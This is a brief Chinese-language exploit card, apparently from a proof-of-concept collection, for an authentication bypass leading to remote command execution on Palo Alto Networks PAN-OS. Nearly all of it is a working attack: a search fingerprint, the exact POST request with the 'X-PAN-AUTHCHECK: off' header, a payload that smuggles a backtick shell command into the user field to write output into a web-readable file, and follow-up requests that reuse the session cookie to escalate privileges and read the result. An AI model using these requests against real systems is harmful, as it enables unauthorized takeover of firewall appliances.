# PaloAltoNetworksPAN-OS身份认证绕过导致RCE漏洞

- **系统**：PaloAltoNetworksPAN　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`"873381299"`
- **请求**：`POST /php/utils/createRemoteAppwebSession.php/rce.js.map HTTP/1.1`
- **关键头**：`X-PAN-AUTHCHECK: off`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
user=`echo $(uname -a) > /var/appweb/htdocs/unauth/rce.php`\&userRole=superuser\&remoteHost=\&vsys=vsys1
携带cookie权限提升并执行命令
GET /index.php/.js.map HTTP/1.1
Host:
Cookie: 上一步返回的cookie
X-PAN-AUTHCHECK: off
获取命令执行结果
GET /unauth/rce.php HTTP/1.1
Host:
Cookie: 上一步获取的cookie
X-PAN-AUTHCHECK: off
```
- **预期**：200　|　—